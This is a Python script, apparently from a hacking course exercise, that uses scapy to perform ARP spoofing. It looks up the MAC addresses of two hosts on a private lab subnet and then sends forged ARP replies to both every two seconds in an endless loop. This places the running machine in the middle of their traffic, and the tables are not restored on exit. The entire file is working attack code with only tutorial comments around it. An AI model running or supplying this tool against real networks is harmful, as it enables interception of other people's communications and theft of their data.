#!/usr/bin/env python


"""In Terminal use > python > import scapy.all as scapy > scapy.ls(scapy.ARP) for help on arguments"""
""" op is set to 1 by default - an ARP packet will create an ARP request BUT we need to create an ARP RESPONSE so op=2"""

import scapy.all as scapy
import time

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=3, verbose=False)[0]

    if len(answered_list) == 0:
        return None

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose = False)


# Create variable for sent packets
sent_packets_count = 0
""" Impplement a Try / Except error handling for when interupted by user"""
try:
    while True:
        spoof("192.168.198.130", "192.168.198.2")
        spoof("192.168.198.2", "192.168.198.130")
        sent_packets_count += 2 # Add two packets for each request
        #  Dynamic Printing - Use an \r "r-literal" and add an end
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detected CTRL + C .... Quitting.")





